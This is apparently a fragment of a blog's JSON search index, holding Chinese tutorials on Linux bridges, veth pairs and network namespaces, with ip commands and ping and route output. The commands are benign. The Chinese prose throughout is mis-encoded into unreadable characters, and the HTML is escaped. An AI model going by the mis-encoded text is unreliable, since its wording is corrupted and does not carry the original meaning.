\t\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e \u0026lt;bridge\u0026gt; \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\t\tshow a list of bridges\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tshowmacs  \t\u0026lt;bridge\u0026gt;\t\tshow a list of mac addrs\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tshowstp   \t\u0026lt;bridge\u0026gt;\t\tshow bridge stp info\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tstp       \t\u0026lt;bridge\u0026gt; \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eon|off\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\tturn stp on/off\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¸¸ç”¨å‘½ä»¤å¦‚\u003c/p\u003e","title":"Linux Bridge è¯¦è§£"},{"content":"Linux veth pair è¯¦è§£ veth pairæ˜¯æˆå¯¹å‡ºç°çš„ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ¥å£ï¼Œä¸€ç«¯è¿ç€ç½‘ç»œåè®®æ ˆï¼Œä¸€ç«¯å½¼æ­¤ç›¸è¿ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nç”±äºå®ƒçš„è¿™ä¸ªç‰¹æ€§ï¼Œå¸¸å¸¸è¢«ç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œæ‹“æ‰‘ã€‚ä¾‹å¦‚è¿æ¥ä¸¤ä¸ªä¸åŒçš„ç½‘ç»œå‘½åç©ºé—´(netns)ï¼Œè¿æ¥dockerå®¹å™¨ï¼Œè¿æ¥ç½‘æ¡¥(Bridge)ç­‰ï¼Œå…¶ä¸­ä¸€ä¸ªå¾ˆå¸¸è§çš„æ¡ˆä¾‹å°±æ˜¯OpenStack Neutronåº•å±‚ç”¨å®ƒæ¥æ„å»ºéå¸¸å¤æ‚çš„ç½‘ç»œæ‹“æ‰‘ã€‚\nå¦‚ä½•ä½¿ç”¨ï¼Ÿ åˆ›å»ºä¸€å¯¹veth\nip link add \u0026lt;veth name\u0026gt; type veth peer name \u0026lt;peer name\u0026gt; å®éªŒ æˆ‘ä»¬æ”¹é€ ä¸Šä¸€èŠ‚å®Œæˆçš„netnså®éªŒï¼Œä½¿ç”¨veth pairå°†ä¸¤ä¸ªçš„éš”ç¦»netnsè¿æ¥èµ·æ¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€å¯¹vethè®¾å¤‡ï¼Œå°†vethè®¾å¤‡åˆ†åˆ«ç§»åŠ¨åˆ°ä¸¤ä¸ªnetnsä¸­å¹¶å¯åŠ¨ã€‚\n# åˆ›å»ºä¸€å¯¹veth ip link add veth0 type veth peer name veth1 # å°†vethç§»åŠ¨åˆ°netnsä¸­ ip link set veth0 netns ns0 ip link set veth1 netns ns1 # å¯åŠ¨ ip netns exec ns0 ip link set veth0 up ip netns exec ns1 ip link set veth1 up æ¥ä¸‹æ¥æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ã€‚\nä½¿ç”¨ip netns exec ns0 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸tap1çš„ç½‘ç»œè¿é€šæ€§ã€‚\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. From 10.0.0.1 icmp_seq=1 Destination Host Unreachable From 10.0.0.1 icmp_seq=2 Destination Host Unreachable From 10.0.0.1 icmp_seq=3 Destination Host Unreachable ^C --- 10.0.0.2 ping statistics --- 5 packets transmitted, 0 received, +3 errors, 100% packet loss, time 77ms pipe 4 ä½¿ç”¨ip netns exec ns1 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§ã€‚\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. From 10.0.0.2 icmp_seq=1 Destination Host Unreachable From 10.0.0.2 icmp_seq=2 Destination Host Unreachable From 10.0.0.2 icmp_seq=3 Destination Host Unreachable ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 0 received, +3 errors, 100% packet loss, time 108ms pipe 4 ä»€ä¹ˆæƒ…å†µï¼Ÿä¸ºä»€ä¹ˆç½‘ç»œè¿˜æ˜¯ä¸é€šå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯è·¯ç”±é…ç½®æœ‰é—®é¢˜ã€‚\nä½¿ç”¨ip netns exec ns0 route -næŸ¥çœ‹ns0çš„è·¯ç”±è¡¨ã€‚\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 tap0 ä½¿ç”¨ip netns exec ns1 route -næŸ¥çœ‹ns1çš„è·¯ç”±è¡¨ã€‚\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 tap1 åŸæ¥è®¿é—®10.0.0.0/24çš„æµé‡éƒ½ä»tapè®¾å¤‡å‘å‡ºå»äº†ï¼Œåˆå› ä¸ºtapè®¾å¤‡æ²¡æœ‰å’Œå…¶ä»–è®¾å¤‡ç›¸è¿ï¼Œå‘å‡ºå»çš„æ•°æ®æŠ¥æ–‡ä¸ä¼šè¢«å¤„ç†ï¼Œå› æ­¤è¿˜æ˜¯è®¿é—®ä¸åˆ°ç›®æ ‡IPï¼Œæˆ‘ä»¬æ¥ä¿®æ”¹ä¸€ä¸‹è·¯ç”±ï¼Œè®©è®¿é—®10.0.0.0/24çš„æµé‡ä»vethè®¾å¤‡å‘å‡ºã€‚\n#ä¿®æ”¹è·¯ç”±å‡ºå£ä¸ºveth ip netns exec ns0 ip route change 10.0.0.0/24 via 0.0.0.0 dev veth0 ip netns exec ns1 ip route change 10.0.0.0/24 via 0.0.0.0 dev veth1 æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹è·¯ç”±\nä½¿ç”¨ip netns exec ns0 route -næŸ¥çœ‹ns0çš„è·¯ç”±è¡¨ã€‚\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 veth0 ä½¿ç”¨ip netns exec ns1 route -næŸ¥çœ‹ns1çš„è·¯ç”±è¡¨ã€‚\nKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 veth1 æœ€åæˆ‘ä»¬å†æ¥æµ‹è¯•ä¸€ä¸‹ã€‚\nä½¿ç”¨ip netns exec ns0 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸tap1çš„ç½‘ç»œè¿é€šæ€§ã€‚\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.031 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.035 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.037 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.043 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 103ms rtt min/avg/max/mdev = 0.031/0.036/0.043/0.007 ms ä½¿ç”¨ip netns exec ns1 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§ã€‚\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.047 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.042 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 66ms rtt min/avg/max/mdev = 0.027/0.041/0.051/0.012 ms å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨veth pairå°†ä¸¤ä¸ªéš”ç¦»çš„netnsæˆåŠŸçš„è¿æ¥åˆ°äº†ä¸€èµ·ã€‚\nä½†æ˜¯è¿™æ ·çš„ç½‘ç»œæ‹“æ‰‘å­˜åœ¨ä¸€ä¸ªå¼Šç«¯ï¼Œéšç€ç½‘ç»œè®¾å¤‡çš„å¢å¤šï¼Œç½‘ç»œè¿çº¿çš„å¤æ‚åº¦å°†æˆå€å¢é•¿ã€‚ å¦‚æœè¿æ¥ä¸‰ä¸ªnetnsæ—¶ï¼Œç½‘ç»œè¿çº¿å°±æˆäº†ä¸‹å›¾çš„æ ·å­\nè€Œå¦‚æœè¿æ¥å››ä¸ªnetnsæ—¶ï¼Œç½‘ç»œè¿çº¿å°±æˆäº†ä¸‹å›¾çš„æ ·å­\nå¦‚æœæœ‰äº”å°è®¾å¤‡ã€‚ã€‚ã€‚\næœ‰æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼ŒLinux Bridgeï¼ˆç½‘æ¡¥ï¼‰ã€‚ä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†ä½¿ç”¨ç½‘æ¡¥æ¥å°†å¤šä¸ªéš”ç¦»çš„netnsè¿æ¥èµ·æ¥ï¼Œè¿™æ ·ç½‘ç»œè¿çº¿å°±éå¸¸æ¸…çˆ½äº†ã€‚\n","permalink":"https://www.typesafe.cn/posts/linux-veth-pair/","summary":"\u003ch1 id=\"linux-veth-pair-è¯¦è§£\"\u003eLinux veth pair è¯¦è§£\u003c/h1\u003e\n\u003cp\u003eveth pairæ˜¯æˆå¯¹å‡ºç°çš„ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ¥å£ï¼Œä¸€ç«¯è¿ç€ç½‘ç»œåè®®æ ˆï¼Œä¸€ç«¯å½¼æ­¤ç›¸è¿ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"virtual-device-veth-1\" loading=\"lazy\" src=\"https://oss.typesafe.cn/virtual-device-veth-1.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç”±äºå®ƒçš„è¿™ä¸ªç‰¹æ€§ï¼Œå¸¸å¸¸è¢«ç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œæ‹“æ‰‘ã€‚ä¾‹å¦‚è¿æ¥ä¸¤ä¸ªä¸åŒçš„ç½‘ç»œå‘½åç©ºé—´(netns)ï¼Œè¿æ¥dockerå®¹å™¨ï¼Œè¿æ¥ç½‘æ¡¥(Bridge)ç­‰ï¼Œå…¶ä¸­ä¸€ä¸ªå¾ˆå¸¸è§çš„æ¡ˆä¾‹å°±æ˜¯OpenStack Neutronåº•å±‚ç”¨å®ƒæ¥æ„å»ºéå¸¸å¤æ‚çš„ç½‘ç»œæ‹“æ‰‘ã€‚\u003c/p\u003e\n\u003ch2 id=\"å¦‚ä½•ä½¿ç”¨\"\u003eå¦‚ä½•ä½¿ç”¨ï¼Ÿ\u003c/h2\u003e\n\u003cp\u003eåˆ›å»ºä¸€å¯¹veth\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eip link add \u0026lt;veth name\u0026gt; type veth peer name \u0026lt;peer name\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"å®éªŒ\"\u003eå®éªŒ\u003c/h2\u003e\n\u003cp\u003eæˆ‘ä»¬æ”¹é€ ä¸Šä¸€èŠ‚å®Œæˆçš„netnså®éªŒï¼Œä½¿ç”¨veth pairå°†ä¸¤ä¸ªçš„éš”ç¦»netnsè¿æ¥èµ·æ¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"https://oss.typesafe.cn/vethpair.png\" loading=\"lazy\" src=\"https://oss.typesafe.cn/vethpair.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€å¯¹vethè®¾å¤‡ï¼Œå°†vethè®¾å¤‡åˆ†åˆ«ç§»åŠ¨åˆ°ä¸¤ä¸ªnetnsä¸­å¹¶å¯åŠ¨ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ›å»ºä¸€å¯¹veth\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link add veth0 type veth peer name veth1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å°†vethç§»åŠ¨åˆ°netnsä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set veth0 netns ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set veth1 netns ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å¯åŠ¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set veth0 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set veth1 up\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ¥ä¸‹æ¥æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ã€‚\u003c/p\u003e","title":"Linux veth pair è¯¦è§£"},{"content":"Network Namespace ï¼ˆä»¥ä¸‹ç®€ç§°netnsï¼‰æ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€é¡¹å®ç°ç½‘ç»œéš”ç¦»çš„åŠŸèƒ½ï¼Œå®ƒèƒ½éš”ç¦»å¤šä¸ªä¸åŒçš„ç½‘ç»œç©ºé—´ï¼Œå¹¶ä¸”å„è‡ªæ‹¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œåè®®æ ˆï¼Œè¿™å…¶ä¸­ä¾¿åŒ…æ‹¬äº†ç½‘ç»œæ¥å£ï¼ˆç½‘å¡ï¼‰ï¼Œè·¯ç”±è¡¨ï¼Œiptablesè§„åˆ™ç­‰ã€‚ä¾‹å¦‚å¤§åé¼é¼çš„dockerä¾¿æ˜¯åŸºäºnetnså®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰‹åŠ¨å®éªŒä¸€ä¸‹netnsçš„éš”ç¦»ç‰¹æ€§ã€‚\nä½¿ç”¨æ–¹å¼ ä½¿ç”¨ip netns helpæŸ¥çœ‹ä½¿ç”¨å¸®åŠ©\nUsage: ip netns list ip netns add NAME ip netns set NAME NETNSID ip [-all] netns delete [NAME] ip netns identify [PID] ip netns pids NAME ip [-all] netns exec [NAME] cmd ... ip netns monitor ip netns list-id å¼€å§‹å®éªŒ æˆ‘ä»¬å°†è¦æ„å»ºå¦‚ä¸‹å›¾çš„ç½‘ç»œ\né¦–å…ˆæˆ‘ä»¬æ·»åŠ ä¸¤ä¸ªtapè®¾å¤‡å¹¶é…ç½®ä¸ŠIPä¿¡æ¯ï¼Œç„¶åæ·»åŠ ä¸¤ä¸ªnetnsï¼Œæœ€åå°†tapè®¾å¤‡ç§»åŠ¨åˆ°netnsä¸­\n# æ·»åŠ å¹¶å¯åŠ¨è™šæ‹Ÿç½‘å¡tapè®¾å¤‡ ip tuntap add dev tap0 mode tap ip tuntap add dev tap1 mode tap ip link set tap0 up ip link set tap1 up # é…ç½®IP ip addr add 10.0.0.1/24 dev tap0 ip addr add 10.0.0.2/24 dev tap1 # æ·»åŠ netns ip netns add ns0 ip netns add ns1 # å°†è™šæ‹Ÿç½‘å¡tap0ï¼Œtap1åˆ†åˆ«ç§»åŠ¨åˆ°ns0å’Œns1ä¸­ ip link set tap0 netns ns0 ip link set tap1 netns ns1 åœ¨å®¿ä¸»æœºå™¨ä¸Šä½¿ç”¨ping 10.0.0.1æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. ^C --- 10.0.0.1 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 58ms åœ¨å®¿ä¸»æœºå™¨ä¸Šä½¿ç”¨ping 10.0.0.2æµ‹è¯•ä¸tap1çš„ç½‘ç»œè¿é€šæ€§\nping 10.0.0.2 PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. ^C --- 10.0.0.2 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 36ms ç”±äºé•¿æ—¶é—´æœªæ”¶åˆ°ICMPçš„å›å¤æŠ¥æ–‡ï¼Œæˆ‘ä½¿ç”¨Ctrl+Cé€€å‡ºäº†ã€‚\nä½¿ç”¨ip netns exec ns0 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸tap1çš„ç½‘ç»œè¿é€šæ€§\nconnect: ç½‘ç»œä¸å¯è¾¾ ä½¿ç”¨ip netns exec ns1 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§\nconnect: ç½‘ç»œä¸å¯è¾¾ åœ¨netnsä¸­æ‰§è¡Œå‘½ä»¤æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯å…ˆåœ¨å®¿ä¸»æœºå™¨ä¸Šæ‰§è¡Œip netns exec \u0026lt;netns name\u0026gt; bashè¿›å…¥netnsï¼Œç„¶åå°±å¯ä»¥åƒæ˜¯åœ¨æœ¬æœºä¸€æ ·æ‰§è¡Œå‘½ä»¤äº†ã€‚å¦ä¸€ç§æ˜¯æ¯æ¬¡åœ¨å®¿ä¸»æœºå™¨ä¸Šä½¿ç”¨å®Œæ•´çš„å‘½ä»¤ï¼Œä¸ºäº†æ˜æ˜¾åŒºåˆ†ï¼Œæˆ‘ä»¬è¿™é‡Œéƒ½ä½¿ç”¨å®Œæ•´çš„å‘½ä»¤ï¼Œä¾‹å¦‚ip netns exec ns0 ping 10.0.0.2çš„å«ä¹‰ä¸ºåœ¨å‘½åç©ºé—´ns0ä¸­æ‰§è¡Œping 10.0.0.2å‘½ä»¤\nå¯ä»¥çœ‹åˆ°åœ¨å®¿ä¸»æœºå™¨ä¸Šè®¿é—®netnsæ˜¯ä¸¢åŒ…ï¼Œè€Œåœ¨netnsä¸­äº’ç›¸è®¿é—®æ˜¯ç½‘ç»œä¸å¯è¾¾äº†ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè®©æˆ‘ä»¬æ¥æ£€æŸ¥ä¸€ä¸‹netnså§ã€‚\nä½¿ç”¨ip netns exec ns0 ip aåœ¨ns0ä¸­æŸ¥çœ‹ç½‘å¡\n1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 16: tap0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 42:ad:98:a2:cc:81 brd ff:ff:ff:ff:ff:ff ä½¿ç”¨ip netns exec ns1 ip aåœ¨ns1ä¸­æŸ¥çœ‹ç½‘å¡\n1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 17: tap1: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 12:06:1d:06:41:57 brd ff:ff:ff:ff:ff:ff å¯ä»¥çœ‹åˆ°ä¸ä»…æœ¬åœ°ç¯å›loå’Œtapè®¾å¤‡çš„çŠ¶æ€éƒ½æ˜¯DOWNï¼Œç”šè‡³å°±è¿tapè®¾å¤‡çš„IPä¿¡æ¯ä¹Ÿæ²¡æœ‰äº†ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸åŒçš„ç½‘ç»œå‘½åç©ºé—´ä¸­ç§»åŠ¨è™šæ‹Ÿç½‘ç»œæ¥å£æ—¶ä¼šé‡ç½®è™šæ‹Ÿç½‘ç»œæ¥å£çš„çŠ¶æ€ã€‚\næˆ‘ä»¬å°†ns0å’Œns1ä¸­çš„ç›¸å…³è®¾å¤‡éƒ½é‡æ–°å¯åŠ¨å¹¶é…ç½®ä¸ŠIP\nip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set tap0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev tap0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set tap1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev tap1 é¦–å…ˆæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹netnsä¸­æœ¬åœ°ç½‘ç»œæ˜¯å¦æ­£å¸¸\nä½¿ç”¨ip netns exec ns0 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•æœ¬åœ°ç½‘å¡æ˜¯å¦å¯åŠ¨\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.084 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.044 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 65ms rtt min/avg/max/mdev = 0.033/0.049/0.084/0.021 ms ä½¿ç”¨ip netns exec ns1 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•æœ¬åœ°ç½‘å¡æ˜¯å¦å¯åŠ¨\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.033 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.034 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.065 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.035 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 65ms rtt min/avg/max/mdev = 0.033/0.049/0.084/0.021 ms å¯ä»¥çœ‹å‡ºæœ¬åœ°ç½‘ç»œæ²¡æœ‰é—®é¢˜ï¼Œç„¶åæˆ‘ä»¬å†æ¥æµ‹è¯•ä¸€ä¸‹ä¸¤ä¸ªnetnsä¹‹é—´çš„ç½‘ç»œè¿é€šæ€§\nä½¿ç”¨ip netns exec ns0 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸tap1çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. ^C --- 10.0.0.2 ping statistics --- 3 packets transmitted, 0 received, 100% packet loss, time 84ms ä½¿ç”¨ip netns exec ns1 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. ^C --- 10.0.0.1 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 30ms å¯ä»¥çœ‹å‡ºæ²¡æœ‰ä»»ä½•ICMPå›å¤åŒ…ï¼Œnetnsç¡®å®æŠŠåœ¨åŒä¸€å°ä¸»æœºä¸Šçš„ä¸¤å¼ è™šæ‹Ÿç½‘å¡éš”ç¦»èµ·æ¥äº†ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬åªæ˜¯ç®€å•çš„ä½¿ç”¨pingå‘½ä»¤æ¥æµ‹è¯•ç½‘ç»œçš„è¿é€šæ€§ï¼Œå®é™…ä¸Šå¯ä»¥åšåˆ°æ›´å¤šï¼Œä¾‹å¦‚ä¿®æ”¹æŸä¸€ä¸ªnetnsçš„è·¯ç”±è¡¨æˆ–è€…é˜²ç«å¢™è§„åˆ™ï¼Œå®Œå…¨ä¸ä¼šå½±å“åˆ°å…¶ä»–çš„netnsï¼Œå½“ç„¶ä¹Ÿä¸ä¼šå½±å“åˆ°å®¿ä¸»æœºå™¨ï¼Œåœ¨è¿™é‡Œç”±äºç¯‡å¹…åŸå› å°±ä¸å†å±•å¼€å®éªŒäº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å®éªŒä¸€ä¸‹ã€‚ä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†å­¦ä¹ å¦ä¸€ä¸ªç½‘ç»œè®¾å¤‡veth pairï¼Œä½¿ç”¨å®ƒæ¥æŠŠä¸¤ä¸ªnetnsè¿æ¥èµ·æ¥ï¼Œè®©ä¸¤ä¸ªéš”ç¦»çš„â€‹netnsä¹‹é—´å¯ä»¥äº’ç›¸é€šä¿¡ã€‚\n","permalink":"https://www.typesafe.cn/posts/linux-netns/","summary":"\u003cp\u003eNetwork Namespace ï¼ˆä»¥ä¸‹ç®€ç§°netnsï¼‰æ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€é¡¹å®ç°ç½‘ç»œéš”ç¦»çš„åŠŸèƒ½ï¼Œå®ƒèƒ½éš”ç¦»å¤šä¸ªä¸åŒçš„ç½‘ç»œç©ºé—´ï¼Œå¹¶ä¸”å„è‡ªæ‹¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œåè®®æ ˆï¼Œè¿™å…¶ä¸­ä¾¿åŒ…æ‹¬äº†ç½‘ç»œæ¥å£ï¼ˆç½‘å¡ï¼‰ï¼Œè·¯ç”±è¡¨ï¼Œiptablesè§„åˆ™ç­‰ã€‚ä¾‹å¦‚å¤§åé¼é¼çš„dockerä¾¿æ˜¯åŸºäºnetnså®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰‹åŠ¨å®éªŒä¸€ä¸‹netnsçš„éš”ç¦»ç‰¹æ€§ã€‚\u003c/p\u003e\n\u003ch3 id=\"ä½¿ç”¨æ–¹å¼\"\u003eä½¿ç”¨æ–¹å¼\u003c/h3\u003e\n\u003cp\u003eä½¿ç”¨\u003ccode\u003eip netns help\u003c/code\u003eæŸ¥çœ‹ä½¿ç”¨å¸®åŠ©\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUsage: ip netns list\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip netns add NAME\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip netns set NAME NETNSID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-all\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e netns delete \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eNAME\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip netns identify \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ePID\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip netns pids NAME\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-all\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e netns exec \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eNAME\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e cmd ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip netns monitor\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       ip netns list-id\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 